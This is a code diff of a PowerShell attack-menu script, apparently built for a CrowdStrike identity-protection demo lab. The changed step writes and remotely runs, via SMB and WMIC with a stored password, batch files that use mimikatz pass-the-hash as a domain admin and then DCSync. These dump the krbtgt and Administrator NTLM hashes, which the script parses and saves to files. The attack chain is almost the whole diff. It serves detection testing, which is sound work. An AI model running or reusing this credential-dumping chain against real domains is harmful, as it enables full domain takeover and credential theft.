@@ -1,7 +1,7 @@
 # ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  CrowdStrike NGSIEM + Identity Protection Demo
-#  Version: 5.6 (2026-04-03)
+#  Version: 5.6.1 (2026-04-03)
 #
 #  Attack narrative:
 #    1. Phishing campaign (narrative)
@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.6"
+$scriptVersion = "5.6.1"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -507,7 +507,7 @@ public class CryptoMD4 {
         }
 
         # ================================================================
-        # STEP 6: DCSYNC ATTACK ON DC (Active - PtH + DCSync)
+        # STEP 6: DCSYNC ATTACK ON DC (Active - remote via DT)
         # ================================================================
         '6' {
             Show-StepBanner -Step "6" -Title "DCSYNC ATTACK ON DC" -Lines @(
@@ -517,7 +517,10 @@ public class CryptoMD4 {
                 "perform DCSync - replicating the AD database directly"
                 "from the Domain Controller via MS-DRSR protocol."
                 ""
-                "Extracts krbtgt hash = Golden Ticket capability."
+                "Executed remotely on DT (domain-joined) via WMIC+SMB."
+                "mimikatz PtH creates DA context, then DCSync replicates"
+                "krbtgt + Administrator hashes from the DC."
+                ""
                 "This is the 'crown jewels' attack."
             ) -Detection "CrowdStrike IDP: DCSync / Suspicious Replication Activity"
 
@@ -536,155 +539,163 @@ public class CryptoMD4 {
                 }
             }
 
+            # --- Load demo credential ---
+            $demoPw = $null
+            if (Test-Path "$idpDir\demo_password.txt") {
+                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
+            } else {
+                $demoPw = Read-Host "  Enter demo password (run Step 4 first)"
+            }
+            if (-not $demoPw) {
+                Write-Host "  [!] No demo password. Run Step 4 first." -ForegroundColor Red
+                break
+            }
+
             Write-Host "  [+] clark.monroe DA hash: $clarkHash" -ForegroundColor Green
+            Write-Host "  [+] demo credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
             Write-Host "  [*] Target DC: $env:ENV_DC_IP ($env:ENV_DOMAIN)" -ForegroundColor White
+            Write-Host "  [*] Execution host: $env:ENV_DT (domain-joined)" -ForegroundColor White
             Write-Host
 
-            # --- Step 6a: Write DCSync batch ---
-            Write-Host "  --- 6a: Creating DCSync script ---" -ForegroundColor Yellow
-            $dcsyncBat = "$idpDir\dcsync_cmd.bat"
-            $dcsyncLog = "C:\IDP_Files\dcsync_output.log"
+            # --- Map SMB admin share to DT ---
+            $dtShare = "\\$env:ENV_DT\C$"
+            $dtIdpRemote = "$dtShare\IDP_Files"
+            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
+            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
+            if (-not (Test-Path $dtIdpRemote)) {
+                Write-Host "  [!] Cannot access $dtIdpRemote" -ForegroundColor Red
+                break
+            }
+            Write-Host "  [+] SMB connected" -ForegroundColor Green
 
+            # Check mimikatz on DT
+            $dtMimiExe = "$dtIdpRemote\Mimikatz\x64\mimikatz.exe"
+            if (-not (Test-Path $dtMimiExe)) {
+                Write-Host "  [!] mimikatz not found on DT. Run Prep_Unmanaged.ps1 on DT." -ForegroundColor Red
+                break
+            }
+            Write-Host "  [+] mimikatz found on DT" -ForegroundColor Green
+            Write-Host
+
+            # --- Step 6a: Write DCSync scripts to DT ---
+            Write-Host "  --- 6a: Writing DCSync scripts to DT ---" -ForegroundColor Yellow
+
+            # Inner batch: mimikatz DCSync (runs as clark.monroe DA via PtH)
+            $sb1 = New-Object System.Text.StringBuilder
+            [void]$sb1.AppendLine('@echo off')
+            [void]$sb1.Append('"C:\IDP_Files\Mimikatz\x64\mimikatz.exe" "privilege::debug" "log C:\IDP_Files\dcsync_output.log" "lsadump::dcsync /domain:')
+            [void]$sb1.Append($env:ENV_DOMAIN)
+            [void]$sb1.Append(' /user:krbtgt" "lsadump::dcsync /domain:')
+            [void]$sb1.Append($env:ENV_DOMAIN)
+            [void]$sb1.AppendLine(' /user:Administrator" "exit"')
+            [System.IO.File]::WriteAllText("$dtIdpRemote\dcsync_inner.bat", $sb1.ToString(), [System.Text.Encoding]::ASCII)
+
+            # Wrapper batch (no-space path for PtH /run:)
+            [System.IO.File]::WriteAllText("$dtIdpRemote\dcsync_wrapper.bat", "@cmd.exe /c C:\IDP_Files\dcsync_inner.bat`r`n", [System.Text.Encoding]::ASCII)
+
+            # Outer batch: mimikatz PtH as clark.monroe -> runs wrapper
             $sb2 = New-Object System.Text.StringBuilder
             [void]$sb2.AppendLine('@echo off')
-            [void]$sb2.AppendLine('echo [*] DCSync attack - replicating AD via MS-DRSR...')
-            [void]$sb2.Append('echo [*] Target: ')
+            [void]$sb2.Append('"C:\IDP_Files\Mimikatz\x64\mimikatz.exe" "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:')
             [void]$sb2.Append($env:ENV_DOMAIN)
-            [void]$sb2.Append(' (DC: ')
-            [void]$sb2.Append($env:ENV_DC_IP)
-            [void]$sb2.AppendLine(')')
-            [void]$sb2.AppendLine('echo.')
-            # mimikatz command: debug + log + dcsync krbtgt + dcsync Administrator + exit
-            [void]$sb2.Append('"C:\IDP_Files\Mimikatz\x64\mimikatz.exe" "privilege::debug" "log ')
-            [void]$sb2.Append($dcsyncLog)
-            [void]$sb2.Append('" "lsadump::dcsync /domain:')
-            [void]$sb2.Append($env:ENV_DOMAIN)
-            [void]$sb2.Append(' /dc:')
-            [void]$sb2.Append($env:ENV_DC_IP)
-            [void]$sb2.Append(' /user:krbtgt" "lsadump::dcsync /domain:')
-            [void]$sb2.Append($env:ENV_DOMAIN)
-            [void]$sb2.Append(' /dc:')
-            [void]$sb2.Append($env:ENV_DC_IP)
-            [void]$sb2.AppendLine(' /user:Administrator" "exit"')
-            [void]$sb2.AppendLine('echo.')
-            [void]$sb2.AppendLine('echo [+] DCSync complete. Output saved.')
-            [void]$sb2.AppendLine('pause')
-            [System.IO.File]::WriteAllText($dcsyncBat, $sb2.ToString(), [System.Text.Encoding]::ASCII)
-            Write-Host "  [+] DCSync batch written" -ForegroundColor Green
+            [void]$sb2.Append(' /ntlm:')
+            [void]$sb2.Append($clarkHash)
+            [void]$sb2.AppendLine(' /run:C:\IDP_Files\dcsync_wrapper.bat" "exit"')
+            [System.IO.File]::WriteAllText("$dtIdpRemote\dcsync_pth.bat", $sb2.ToString(), [System.Text.Encoding]::ASCII)
 
-            # --- Wrapper batch (single path, no spaces for /run:) ---
-            $dcsyncWrapper = "$idpDir\pth_dcsync.bat"
-            [System.IO.File]::WriteAllText($dcsyncWrapper, "@cmd.exe /c `"$dcsyncBat`"`r`n", [System.Text.Encoding]::ASCII)
+            Write-Host "  [+] DCSync scripts written to DT" -ForegroundColor Green
 
             # Clean previous output
-            if (Test-Path $dcsyncLog) { Remove-Item $dcsyncLog -Force }
-
-            # --- Step 6b: PtH launcher ---
-            Write-Host "  --- 6b: Pass-the-Hash as clark.monroe ---" -ForegroundColor Yellow
-            $pthLauncher = "$idpDir\launch_dcsync.bat"
-            $sb = New-Object System.Text.StringBuilder
-            [void]$sb.AppendLine('@echo off')
-            [void]$sb.AppendLine('echo [*] PtH as clark.monroe DA - launching DCSync...')
-            [void]$sb.AppendLine('echo.')
-            [void]$sb.Append('"')
-            [void]$sb.Append($mimiExe)
-            [void]$sb.Append('" "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:')
-            [void]$sb.Append($env:ENV_DOMAIN)
-            [void]$sb.Append(' /ntlm:')
-            [void]$sb.Append($clarkHash)
-            [void]$sb.Append(' /run:')
-            [void]$sb.Append($dcsyncWrapper)
-            [void]$sb.AppendLine('" "exit"')
-            [System.IO.File]::WriteAllText($pthLauncher, $sb.ToString(), [System.Text.Encoding]::ASCII)
-            Write-Host "  [+] PtH launcher written" -ForegroundColor Green
+            if (Test-Path "$dtIdpRemote\dcsync_output.log") {
+                Remove-Item "$dtIdpRemote\dcsync_output.log" -Force
+            }
             Write-Host
 
-            Write-Host "  [*] This will:" -ForegroundColor White
-            Write-Host "    1. PtH as clark.monroe (DA) via mimikatz" -ForegroundColor Gray
-            Write-Host "    2. DCSync krbtgt + Administrator from DC" -ForegroundColor Gray
-            Write-Host "    3. Save output to dcsync_output.log" -ForegroundColor Gray
+            Write-Host "  [*] Attack chain on DT:" -ForegroundColor White
+            Write-Host "    1. WMIC runs dcsync_pth.bat as demo (local admin)" -ForegroundColor Gray
+            Write-Host "    2. mimikatz PtH creates clark.monroe DA token" -ForegroundColor Gray
+            Write-Host "    3. Spawned process runs mimikatz DCSync to DC" -ForegroundColor Gray
+            Write-Host "    4. Extracts krbtgt + Administrator hashes" -ForegroundColor Gray
             Write-Host
             Write-Host "  [!] TRIGGERS: CrowdStrike IDP DCSync detection on DC" -ForegroundColor Red
             Write-Host
 
             $doSync = Read-Host "  Launch DCSync? (Y/n)"
             if ($doSync -ne 'n') {
-                try {
-                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$pthLauncher`""
+                # --- Step 6b: Execute via WMIC ---
+                Write-Host "  --- 6b: Executing DCSync via WMIC on DT ---" -ForegroundColor Yellow
+                $wmicCmd = "wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"cmd.exe /c C:\IDP_Files\dcsync_pth.bat`""
+                cmd.exe /c $wmicCmd 2>&1 | Out-Null
+                Write-Host "  [+] WMIC process launched on DT." -ForegroundColor Green
+                Write-Host "  [*] Waiting for DCSync output..." -ForegroundColor White
+
+                # --- Wait for output (SMB cache refresh) ---
+                $maxWait = 60
+                $waited = 0
+                $syncFound = $false
+                while ($waited -lt $maxWait) {
+                    Start-Sleep -Seconds 4
+                    $waited += 4
+                    $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\dcsync_output.log`" 2>nul" | Out-String
+                    if ($dirCheck -match "dcsync_output\.log") {
+                        # Check file has content (mimikatz may still be writing)
+                        Start-Sleep -Seconds 5
+                        $peek = cmd.exe /c "type `"$dtIdpRemote\dcsync_output.log`"" | Out-String
+                        if ($peek -match "Hash NTLM" -or $peek.Length -gt 500) {
+                            $syncFound = $true
+                            break
+                        }
+                    }
+                    Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
+                }
+
+                # --- Retrieve and display ---
+                if ($syncFound) {
+                    $dcsyncContent = cmd.exe /c "type `"$dtIdpRemote\dcsync_output.log`"" | Out-String
                     Write-Host
-                    Write-Host "  [+] DCSync launched in new window." -ForegroundColor Green
-                    Write-Host "  [*] Waiting for results..." -ForegroundColor White
+                    Write-Host "  === DCSync Results ===" -ForegroundColor Yellow
+                    Write-Host $dcsyncContent -ForegroundColor Gray
+                    Write-Host
 
-                    # --- Wait for output file ---
-                    $maxWait = 60
-                    $waited = 0
-                    $syncFound = $false
-                    while ($waited -lt $maxWait) {
-                        Start-Sleep -Seconds 3
-                        $waited += 3
-                        if (Test-Path $dcsyncLog) {
-                            # Check if mimikatz finished writing (file should contain "exit")
-                            $peek = Get-Content $dcsyncLog -Raw -ErrorAction SilentlyContinue
-                            if ($peek -and ($peek -match "Hash NTLM" -or $peek.Length -gt 500)) {
-                                Start-Sleep -Seconds 3
-                                $syncFound = $true
-                                break
-                            }
-                        }
-                        Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
+                    # Save locally
+                    $dcsyncContent | Out-File -FilePath "$idpDir\dcsync_results.log" -Encoding ASCII
+                    Write-Host "  [+] Full results saved: $idpDir\dcsync_results.log" -ForegroundColor Green
+
+                    # Extract krbtgt hash
+                    if ($dcsyncContent -match "(?s)Object RDN\s*:\s*krbtgt.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
+                        $krbtgtHash = $Matches[1]
+                        Write-Host
+                        Write-Host "  ========================================" -ForegroundColor Red
+                        Write-Host "  [!!!] KRBTGT HASH EXTRACTED" -ForegroundColor Red
+                        Write-Host "  [!!!] $krbtgtHash" -ForegroundColor Red
+                        Write-Host "  [!!!] Golden Ticket capability achieved" -ForegroundColor Red
+                        Write-Host "  ========================================" -ForegroundColor Red
+                        $krbtgtHash | Out-File -FilePath "$idpDir\krbtgt_hash.txt" -Encoding ASCII
                     }
 
-                    if ($syncFound -or (Test-Path $dcsyncLog)) {
-                        $dcsyncContent = Get-Content $dcsyncLog -Raw -ErrorAction SilentlyContinue
-                        if (-not $dcsyncContent) {
-                            $dcsyncContent = cmd.exe /c "type `"$dcsyncLog`"" | Out-String
-                        }
-                        Write-Host
-                        Write-Host "  === DCSync Results ===" -ForegroundColor Yellow
-                        Write-Host $dcsyncContent -ForegroundColor Gray
-                        Write-Host
-
-                        # Save locally
-                        $dcsyncContent | Out-File -FilePath "$idpDir\dcsync_results.log" -Encoding ASCII
-                        Write-Host "  [+] Full results saved: $idpDir\dcsync_results.log" -ForegroundColor Green
-
-                        # Extract krbtgt hash
-                        if ($dcsyncContent -match "(?s)Object RDN\s*:\s*krbtgt.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
-                            $krbtgtHash = $Matches[1]
-                            Write-Host
-                            Write-Host "  ========================================" -ForegroundColor Red
-                            Write-Host "  [!!!] KRBTGT HASH EXTRACTED" -ForegroundColor Red
-                            Write-Host "  [!!!] $krbtgtHash" -ForegroundColor Red
-                            Write-Host "  [!!!] Golden Ticket capability achieved" -ForegroundColor Red
-                            Write-Host "  ========================================" -ForegroundColor Red
-                            $krbtgtHash | Out-File -FilePath "$idpDir\krbtgt_hash.txt" -Encoding ASCII
-                        }
-
-                        # Extract Administrator hash
-                        if ($dcsyncContent -match "(?s)Object RDN\s*:\s*Administrator.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
-                            $adminHash = $Matches[1]
-                            Write-Host "  [+] Administrator NTLM: $adminHash" -ForegroundColor Green
-                            $adminHash | Out-File -FilePath "$idpDir\admin_hash.txt" -Encoding ASCII
-                        }
-
-                        if ($dcsyncContent -notmatch "Hash NTLM") {
-                            Write-Host "  [-] No hashes found in output. DCSync may have failed." -ForegroundColor Yellow
-                            Write-Host "  [*] Check the DCSync window for errors." -ForegroundColor Yellow
-                        }
-                    } else {
-                        Write-Host "  [!] No output after ${maxWait}s." -ForegroundColor Red
-                        Write-Host "  [*] Check the DCSync window for errors." -ForegroundColor Yellow
-                        Write-Host "  [*] Ensure DC ($env:ENV_DC_IP) is reachable on RPC ports." -ForegroundColor Yellow
+                    # Extract Administrator hash
+                    if ($dcsyncContent -match "(?s)Object RDN\s*:\s*Administrator.*?Hash NTLM:\s*([0-9a-fA-F]{32})") {
+                        $adminHash = $Matches[1]
+                        Write-Host "  [+] Administrator NTLM: $adminHash" -ForegroundColor Green
+                        $adminHash | Out-File -FilePath "$idpDir\admin_hash.txt" -Encoding ASCII
                     }
-                } catch {
-                    Write-Host "  [!] Error launching DCSync: $_" -ForegroundColor Red
+
+                    if ($dcsyncContent -notmatch "Hash NTLM") {
+                        Write-Host "  [-] No hashes in output. DCSync may have failed." -ForegroundColor Yellow
+                        Write-Host "  [*] Check DT for error details." -ForegroundColor Yellow
+                    }
+                } else {
+                    Write-Host "  [!] No output after ${maxWait}s." -ForegroundColor Red
+                    Write-Host "  [*] Check DT manually: type C:\IDP_Files\dcsync_output.log" -ForegroundColor Yellow
+                    Write-Host "  [*] PtH may have failed in session 0. Try running Prep Lab (P) first." -ForegroundColor Yellow
                 }
             }
 
-            # Cleanup temp files (keep results)
-            Remove-Item $dcsyncBat -Force -ErrorAction SilentlyContinue
-            Remove-Item $dcsyncWrapper -Force -ErrorAction SilentlyContinue
-            Remove-Item $pthLauncher -Force -ErrorAction SilentlyContinue
+            # Cleanup scripts (keep output)
+            @("$dtIdpRemote\dcsync_inner.bat", "$dtIdpRemote\dcsync_wrapper.bat", "$dtIdpRemote\dcsync_pth.bat") | ForEach-Object {
+                Remove-Item $_ -Force -ErrorAction SilentlyContinue
+            }
+            net use $dtShare /delete /y 2>$null | Out-Null
             Write-Host
         }
 
